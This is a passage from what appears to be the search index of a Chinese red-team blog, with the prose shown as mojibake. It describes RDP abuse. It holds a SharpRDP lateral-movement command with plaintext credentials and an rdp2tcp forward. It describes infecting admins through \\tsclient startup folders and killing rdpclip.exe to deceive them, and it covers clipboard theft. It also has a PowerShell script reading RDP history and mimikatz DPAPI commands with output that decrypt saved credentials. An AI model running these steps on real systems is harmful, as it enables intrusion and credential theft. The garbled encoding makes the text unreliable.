rdp2tcp.py add forward 127.0.0.1 445 192.168.112.129 445 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:2:2","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3 åˆ©ç”¨ RDP æ¨ªå‘ç§»åŠ¨ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:3:0","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.1 æµ‹è¯• æœ¬èŠ‚ä»‹ç»çš„æ˜¯å¦‚ä½•åœ¨ä¸é€šè¿‡ GUI å®¢æˆ·ç«¯å’Œ Socks ä»£ç†çš„æƒ…å†µä¸‹ï¼ŒåŸºäº RDP åè®®è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚ Windows ä¸‹ mstscax.dll åº“å¯ä»¥æ‰§è¡Œä»»ä½• RDP åŠŸèƒ½ï¼Œæ­¤ DLL æ˜¯ Microsoft ç»ˆç«¯æœåŠ¡çš„ ActiveX COM åº“ã€‚é€šè¿‡åˆ©ç”¨æ­¤ DLLï¼Œæµ‹è¯•äººå‘˜å¯ä»¥åˆ›å»ºæ§åˆ¶å°åº”ç”¨ç¨‹åºï¼Œè¯¥æ§åˆ¶å°åº”ç”¨ç¨‹åºé€šè¿‡ RDP æ‰§è¡Œç»è¿‡èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œè€Œæ— éœ€ GUI å®¢æˆ·ç«¯æˆ– SOCKS ä»£ç†ã€‚ åœ¨ Cobalt Strike ä¸­æ‰§è¡Œï¼š ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼š SharpRDP.exe computername=dc01 command=calc username=offense\\administrator password=123456 æœ‰ä¸¤ç§èº«ä»½éªŒè¯æ–¹æ³•ï¼Œä¸€ç§æ˜¯æä¾›çº¯æ–‡æœ¬å‡­æ®ï¼ˆå¦‚ä¸Šï¼‰ï¼Œå¦ä¸€ç§æ˜¯ä½¿ç”¨å—é™ç®¡ç†æ¨¡å¼çš„å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡ã€‚å—é™ç®¡ç†æ¨¡å¼æ˜¯ä¸€ç§ Windows ä¿æŠ¤æœºåˆ¶ï¼Œå®ƒè¦æ±‚æ‰§è¡Œç½‘ç»œç±»å‹ç™»å½•è€Œä¸æ˜¯äº¤äº’å¼ç™»å½•ï¼Œå³ PTHã€‚ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:3:1","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.2 åœºæ™¯ æœ‰æ—¶åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒRDP æ˜¯æ‰§è¡Œæ¨ªå‘ç§»åŠ¨æŠ€æœ¯çš„é¦–é€‰æ–¹æ³•ï¼Œä½†ä½¿ç”¨ä¼ ç»Ÿçš„ RDP å®¢æˆ·ç«¯ GUI å¯èƒ½å¾ˆå›°éš¾ã€‚å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œå°†å‘½ä»¤æ‰§è¡Œè¿‡ç¨‹éšè—åœ¨ RDP åè®®ä¸­ã€‚ å…¶æ¬¡ï¼Œå¯ä»¥åœ¨æ²¡æœ‰ç³»ç»Ÿæœ¬åœ°ç®¡ç†ç‰¹æƒä½†å¯¹ç³»ç»Ÿæ‹¥æœ‰ RDP æƒé™çš„æƒ…å†µä¸‹åˆ©ç”¨ RDP è¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œå¯ä»¥åˆ©ç”¨ BloodHound è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:3:2","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4 RDP æŒ‚ç›˜åæ‰“ åˆ©ç”¨ æŒ‚ç›˜ç›‘æ§ + æ³¨å…¥å¯åŠ¨é¡¹ è¿›è¡Œæ”»å‡» ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:4:0","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4.1 åŸç† tsclient æ˜¯é€šè¿‡è¿œç¨‹æ¡Œé¢è¿æ¥åˆ°è¿œç¨‹è®¡ç®—æœºæ—¶ï¼Œåœ¨è¿œç¨‹è®¡ç®—æœºã€Œç½‘ä¸Šé‚»å±…ã€ä¸­å‡ºç°çš„ä¸€ä¸ªæœºå™¨åï¼Œå®é™…ä¸ºè¿œç¨‹è®¡ç®—æœºåˆ†é…ç»™æœ¬æœºçš„åç§°ã€‚ é€šè¿‡ \\\\tsclient\\ç›˜ç¬¦ å¯ä»¥åœ¨è¿œç¨‹è®¡ç®—æœºä¸Šè®¿é—®æœ¬æœºã€‚å…¶è®¿é—®æ–¹å¼ç±»ä¼¼äºä½¿ç”¨ smb è¿›è¡Œæ–‡ä»¶ä¼ è¾“ï¼Œè™½ç„¶æœ¬è´¨ä¸Šéƒ½æ˜¯ smb åè®®ï¼Œä½†æ˜¯ä½¿ç”¨ tsclient æ— éœ€èº«ä»½è®¤è¯ï¼Œå› æ­¤å¯ä»¥ç›´æ¥å°†é€šè¿‡é¢„åˆ¶æ‰‹æ®µï¼Œä½¿ç”¨ tsclient åå‘æ„ŸæŸ“ã€‚ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:4:1","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4.2 åˆ©ç”¨ é€šå¸¸æƒ…å†µä¸‹ï¼Œtsclient çš„åˆ©ç”¨æ€è·¯è¾ƒä¸ºç®€å•ï¼Œé€šè¿‡æ–‡ä»¶ä¼ è¾“å°†æ¶æ„ç¨‹åºè„šæœ¬å†™å…¥ç”¨æˆ·çš„å¯åŠ¨ï¼ˆstartupï¼‰æ–‡ä»¶å¤¹ï¼Œå½“æœºå™¨é‡å¯æ—¶ï¼Œå°±ä¼šæ‰§è¡Œæ¶æ„ç¨‹åºè„šæœ¬ã€‚ å·¥å…·ï¼šhttps://github.com/mdsecactivebreach/RDPInception/ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:4:2","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4.3 é™åˆ¶æ¡ä»¶ mstsc éœ€è¦å¼€å¯é©±åŠ¨å™¨ C ç›˜ï¼Œä½†æ˜¯é»˜è®¤æƒ…å†µä¸‹ mstsc æ˜¯ä¸å¼€å¯ç£ç›˜å…±äº«åŠŸèƒ½çš„ã€‚å¿…é¡»è¦æ‰‹å·¥å¼€å¯ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š å½“å¼€å¯ RDP è¿œç¨‹è®¿é—®æ—¶ï¼Œåªæœ‰è¿œç¨‹ç™»å½•çš„ç”¨æˆ·å¯ä»¥è®¿é—® tsclientã€‚å…¶ä»–ç”¨æˆ·æ— æ³•è®¿é—®ï¼ŒåŒ…æ‹¬ä½¿ç”¨ runas ä¹Ÿæ— æ³•è®¿é—®ã€‚ è™½ç„¶é™åˆ¶æ¡ä»¶è¾ƒå¤šï¼Œä½†åœ¨å®é™…ç¯å¢ƒä¸­ï¼Œå¾ˆå¤šè¿ç»´äººå‘˜ä¸ºäº†æ–¹ä¾¿æ“ä½œï¼Œé€šå¸¸ä¼šæŒ‚è½½ç£ç›˜ï¼Œå› æ­¤è¿™ä¸€æ–¹æ³•å¹¶éå…¨ç„¶æ— ç”¨ï¼Œéœ€è¦æ ¹æ®å®é™…æƒ…å†µåˆ¤æ–­ã€‚çŒ¥çä¸€äº›çš„æ€è·¯ï¼šåœ¨è„šæœ¬æ‰¾ä¸åˆ°æŒ‚è½½ç£ç›˜çš„æƒ…å†µä¸‹ï¼Œç›´æ¥ç»“æŸ rdpclip.exe ä½¿ç®¡ç†å‘˜æ— æ³•ä½¿ç”¨å‰ªåˆ‡æ¿åŠŸèƒ½ï¼Œè¿«ä½¿ç®¡ç†å‘˜åœ¨ä¸æ¸…æ¥šåŸå› çš„çŠ¶å†µä¸‹ï¼Œç›´æ¥é‡æ–°æŒ‚è½½ä¸Šç£ç›˜æ“ä½œã€‚ æœ€åï¼Œä¸åŒäº smb ä¸Šä¼ æ–‡ä»¶åä½¿ç”¨è®¡åˆ’ä»»åŠ¡å¯åŠ¨ï¼Œç”±äºä¸çŸ¥é“è¢«æ„ŸæŸ“çš„æœºå™¨ç”¨æˆ·èº«ä»½ï¼Œå› æ­¤åªèƒ½ä¾æ‰˜äºå¯åŠ¨é¡¹å¼€æœºè‡ªå¯åŠ¨ã€‚å› æ­¤ï¼Œè¯¥æ”»å‡»æ–¹å¼å¯¹æœåŠ¡å™¨æ”»å‡»æ•ˆæœè¾ƒå¼±ã€‚ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:4:3","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"5 å‰ªåˆ‡æ¿åˆ©ç”¨æ–¹æ³• é™¤äº†åˆ©ç”¨æ–‡ä»¶ä¼ è¾“ä»¥å¤–ï¼Œå…¶å®è¿˜å¯ä»¥å°è¯•åˆ©ç”¨å‰ªåˆ‡æ¿åŠ«æŒçš„æ–¹æ³•è¿›è¡Œåå‘æ”»å‡»ã€‚ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:5:0","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"5.1 å‰ªåˆ‡æ¿çªƒå– 5.1.1 åŸç† åœ¨ä½¿ç”¨ mstsc è¿›è¡Œè¿œç¨‹æ¡Œé¢çš„æ—¶å€™ï¼Œä¼šå¯åŠ¨ä¸€ä¸ªå« rdpclip.exe çš„è¿›ç¨‹ï¼Œè¯¥è¿›ç¨‹çš„åŠŸèƒ½æ˜¯åŒæ­¥æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯çš„å‰ªè´´æ¿ã€‚ è€Œè¿™ä¸ªè¿›ç¨‹æ˜¯ä¸€ä¸ªååˆ†æœ‰ç”¨çš„è¿›ç¨‹ï¼Œå¦‚ä¸Šæ–‡æåˆ°çš„ï¼Œå¦‚æœç›´æ¥ç»“æŸè¯¥è¿›ç¨‹ï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯(è¿œç¨‹æœºå™¨)ä¸Šå°†æŸäº›æ•°æ®æ‹·è´åˆ°å®¢æˆ·ç«¯ï¼ˆæœ¬åœ°æœºå™¨ï¼‰ä¸Šæ—¶ï¼Œå°±ä¼šå‘ç°å‰ªè´´æ¿å¤±æ•ˆï¼Œæ— æ³•å¤åˆ¶ã€‚ ç”±äºå¯åŠ¨è¯¥è¿›ç¨‹æ—¶ï¼Œä¼šè‡ªåŠ¨åŒæ­¥å‰ªåˆ‡æ¿å†…å®¹ï¼Œå› æ­¤å½“ç›®æ ‡ç›®æ ‡æœºå™¨ä¸å…¶ä»–æœºå™¨ä½¿ç”¨ mstsc å»ºç«‹ RDP è¿œç¨‹è¿æ¥æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡è¯»å– rdplicp.exe è¿›ç¨‹æ•°æ®ï¼Œè¿›è¡Œå‰ªè´´æ¿çªƒå–ï¼Œä»¥å°½å¯èƒ½åœ°è·å–æ›´å¤šçš„ä¿¡æ¯ã€‚ æ­¤å¤–ï¼Œç”±äºè¯¥è¿›ç¨‹æ˜¯åå°è¿è¡Œçš„ï¼Œå½“ç®¡ç†å‘˜åŒæ—¶ç”¨è¿œç¨‹æ¡Œé¢ç™»é™†å¤šä¸ªæœåŠ¡å™¨ï¼Œåœ¨å…¶ä¸­çš„æŸä¸€ä¸ªæœåŠ¡å™¨ä¸Šè¿›è¡Œå¤åˆ¶æ‹·è´æ“ä½œæ—¶ï¼Œä¼šå°†æ•°æ®åŒæ­¥åˆ°æ‰€æœ‰æœåŠ¡å™¨çš„ rdplicp.exe è¿›ç¨‹ã€‚ 5.1.2 åˆ©ç”¨ åœ¨ empire ä¸­æœ‰ä¸€ä¸ª Get-ClipboardContents.ps1ï¼Œå¯ä»¥ç”¨ empire æˆ–è€… coablt strike åŠ è½½è¯¥è„šæœ¬ã€‚æˆ–è€…ä¹Ÿå¯ä»¥è‡ªå·±ç¼–å†™ç›¸å…³è„šæœ¬ä½¿ç”¨ã€‚æ˜¯ä¸€ä¸ªç›¸å¯¹ç®€å•çš„å·¥å…·ã€‚ ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸ tsclient ç±»ä¼¼ï¼ŒåŒè®¡ç®—æœºçš„ä¸åŒç”¨æˆ·ä¹‹é—´æ˜¯æ— æ³•è¯»å–çš„ï¼Œæ¯ä¸€ä¸ªç”¨æˆ·çš„ rdplicp.exe æ˜¯ç‹¬ç«‹å¯åŠ¨çš„ã€‚ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:5:1","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"5.2 å‰ªåˆ‡æ¿ä¼ è¾“æ¶æ„æ–‡ä»¶ å½“æˆ‘ä»¬ç”¨mstscç™»é™†äº†ä¸€å°æœåŠ¡å™¨åï¼Œåœ¨è¯¥æœåŠ¡å™¨ä¸ŠæŒ‰ä¸‹å¤åˆ¶æ“ä½œæ—¶ï¼Œä¼šäº§ç”Ÿä¸€ç³»åˆ—æ“ä½œã€‚ 5.2.1 åŸç† åœ¨è¿œç¨‹æ¡Œé¢æ—¶ï¼Œä½¿ç”¨å‰ªåˆ‡æ¿ä¼ è¾“ä¸€ä¸ªæ–‡ä»¶çš„æµç¨‹å¦‚ä¸‹ï¼š 1ã€åœ¨æœåŠ¡å™¨ä¸Šï¼Œâ€œå¤åˆ¶\"æ“ä½œä¼šåˆ›å»ºæ ¼å¼ä¸º â€œCF_HDROPâ€ çš„å‰ªè´´æ¿æ•°æ® 2ã€åœ¨å®¢æˆ·ç«¯è®¡ç®—æœºä¸­æ‰§è¡Œã€Œç²˜è´´ã€æ—¶ï¼Œå°†è§¦å‘ä¸€ç³»åˆ—äº‹ä»¶ 3ã€è¦æ±‚æœåŠ¡å™¨ä¸Šçš„ rdpclip.exe è¿›ç¨‹æä¾›å‰ªè´´æ¿çš„å†…å®¹ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸º FileGroupDescriptor(Fgd) å‰ªè´´æ¿æ ¼å¼ 4ã€ä½¿ç”¨ HdropToFgdConverter::AddItemToFgd() å‡½æ•°ï¼Œå°†æ–‡ä»¶çš„å…ƒæ•°æ®æ·»åŠ åˆ°æè¿°ç¬¦ä¸­ 5ã€å®Œæˆåï¼Œå°† Fgd Blob å‘é€åˆ°æœåŠ¡å™¨ä¸Šçš„ RDP æœåŠ¡ 6ã€æœåŠ¡å™¨åªæ˜¯å°†å…¶åŒ…è£…å¹¶å°†å…¶å‘é€ç»™å®¢æˆ·ç«¯ 7ã€å®¢æˆ·ç«¯å°†å…¶è§£åŒ…å¹¶å°†å…¶å­˜å‚¨åœ¨è‡ªå·±çš„å‰ªè´´æ¿ä¸­ 8ã€ã€Œç²˜è´´ã€äº‹ä»¶å°†å‘é€åˆ°å½“å‰çª—å£ï¼ˆä¾‹å¦‚ï¼Œexplorer.exeï¼‰ 9ã€å¤„ç†äº‹ä»¶å¹¶ä»å‰ªè´´æ¿è¯»å–æ•°æ® 10ã€é€šè¿‡ RDP è¿æ¥æ¥æ”¶æ–‡ä»¶çš„å†…å®¹ 5.2.2 åˆ©ç”¨ https://github.com/qianshuidewajueji/CVE-2019-0887 https://github.com/0xedh/mstsc-path-traversal ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:5:2","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"6 RDP Thief æ¯æ¬¡æˆåŠŸè¿æ¥åˆ°è¿œç¨‹ä¸»æœºæ—¶ï¼ŒRDP å®¢æˆ·ç«¯éƒ½ä¼šä¿å­˜è¿œç¨‹ä¸»æœºçš„åç§°ï¼ˆæˆ–IPåœ°å€ï¼‰ä»¥åŠç”¨äºç™»é™†çš„ç”¨æˆ·åã€‚å†æ¬¡å¯åŠ¨ mstsc.exe æ—¶ï¼Œå¯ä»¥ç›´æ¥ä»åˆ—è¡¨ä¸­é€‰æ‹©è¿œç¨‹ RDP æœåŠ¡å™¨çš„åç§°ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯å·²è‡ªåŠ¨å¡«å†™ç”¨äºç™»é™†çš„ç”¨æˆ·åã€‚ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:6:0","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"6.1 è·å–è¿æ¥å†å²è®°å½• \u003c# .SYNOPSIS This script will list the logged-in users' RDP Connections History. #\u003e $AllUser = Get-WmiObject -Class Win32_UserAccount foreach($User in $AllUser) { $RegPath = \"Registry::HKEY_USERS\\\"+$User.SID+\"\\Software\\Microsoft\\Terminal Server Client\\Servers\\\" Write-Host \"User:\"$User.Name Write-Host \"SID:\"$User.SID Write-Host \"Status:\"$User.Status Try { $QueryPath = dir $RegPath -Name -ErrorAction Stop } Catch { Write-Host \"No RDP Connections History\" Write-Host \"----------------------------------\" continue } foreach($Name in $QueryPath) { Try { $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint Write-Host \"User:\"$User Write-Host \"Server:\"$Name } Catch { Write-Host \"No RDP Connections History\" } } Write-Host \"----------------------------------\" } ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:6:1","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"6.2 ç ´è§£ RDP è¿æ¥å‡­è¯ ç ´è§£ RDP è¿æ¥å‡­è¯çš„å‰ææ˜¯ç”¨æˆ·åœ¨è¿æ¥è¿œç¨‹ä¸»æœºæ—¶å‹¾é€‰äº†ä¿å­˜ä¿å­˜å‡­è¯ã€‚ æŸ¥æ‰¾æœ¬åœ°çš„ Credentials dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\* ä½¿ç”¨ mimikatz è¿›è¡Œæ“ä½œ mimikatz dpapi::cred /in:C:\\Users\\by\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D **BLOB** dwVersion : 00000001 - 1 guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwMasterKeyVersion : 00000001 - 1 guidMasterKey : {ffc994a1-de8d-4304-9416-31e587f7a8ca} dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 00000030 - 48 szDescription : Local Credential Data algCrypt : 00006610 - 26128 (CALG_AES_256) dwAlgCryptLen : 00000100 - 256 dwSaltLen : 00000020 - 32 pbSalt : 00fed8ca7ec6d44585dd1fbd8b57e77b6ab0cf318ec5d52d09fd0694ffb89ccb dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 0000800e - 32782 (CALG_SHA_512) dwAlgHashLen : 00000200 - 512 dwHmac2KeyLen : 00000020 - 32 pbHmack2Key : b49ef55f909fa503eda37ddc797c83c99df983920bfb4628e07aac5cb32bb530 dwDataLen : 000000b0 - 176 pbData : 4083f8f501b999a35c4aa57ce732bf52d30a6e604dac5a91b6fd3e65660c52a536025c5126f0d12b85044498deef08a8688b3459f49514ed6ae46271a1cb4cd0e70845d9b6beccbcbe85dead0fb7c80b4f7810add87b75c48592fcbfbbfd94fa4eee8004f8cf6d9619ef4b9af643f4c9ef0e8a2a5b0cd00530a5638cfd114fee4b735ac12eef2c7e6a0364845eb0ee4b3ab121e33324f8d5af48f3422bd47a76ab5e9e9e5a1a383e22fff8bf851b6a2a dwSignLen : 00000040 - 64 pbSign : 7c8dbe7991c6af4d3bfc9f808790a0904738d0ca227bc2ee20ee26cbf06487dd2679e932b27ea0c0cbbe590ee6430641605d7001b2158c8873c5d6a09a9855a8 æ¥ä¸‹æ¥éœ€è¦ä½¿ç”¨çš„å°±æ˜¯ guidMasterKeyã€pbData æ•°æ®ã€‚pbData æ˜¯å‡­æ®çš„åŠ å¯†æ•°æ®ï¼ŒguidMasterKey æ˜¯å‡­æ®çš„ GUID ä½¿ç”¨ sekurlsa::dpapi æ ¹æ®ç›®æ ‡å‡­æ® GUID:{ffc994a1-de8d-4304-9416-31e587f7a8ca}æ‰¾åˆ°å…¶å…³è”çš„ MasterKeyï¼Œè¿™ä¸ª MasterKey å°±æ˜¯åŠ å¯†å‡­æ®çš„å¯†é’¥ï¼Œå³è§£å¯† pbData æ‰€å¿…é¡»çš„ä¸œè¥¿ã€‚ è§£å¯† dpapi::cred /in:C:\\Users\\by\\AppData\\Local\\Microsoft\\Credentials\\AB07963F1A0A1CB56827E93395597FC6 /masterkey:e01320a53bf9d57da1163c7723a5b3901df5a3fc8e504fc021def2637d19d34c0084a3ac2a0daab3fb9af3f98c48a9a901627dc4b10db087cb357e1d2f8aa18c å‚è€ƒï¼š https://research.nccgroup.com/2020/05/06/tool-release-socks-over-rdp/ https://3gstudent.github.io/3gstudent.github.io/æ¸—é€æŠ€å·§-ä½¿ç”¨è¿œç¨‹æ¡Œé¢åè®®å»ºç«‹é€šé“/ https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3 https://github.com/0xthirteen/SharpRDP åˆ©ç”¨ mstsc åå‘æ”»å‡»æ€è·¯æ•´ç† https://research.checkpoint.com/reverse-rdp-attack-code-execution-on-rdp-clients/ https://paper.seebug.org/1074/ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:6:2","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç† ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:0:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"1 SQL Server 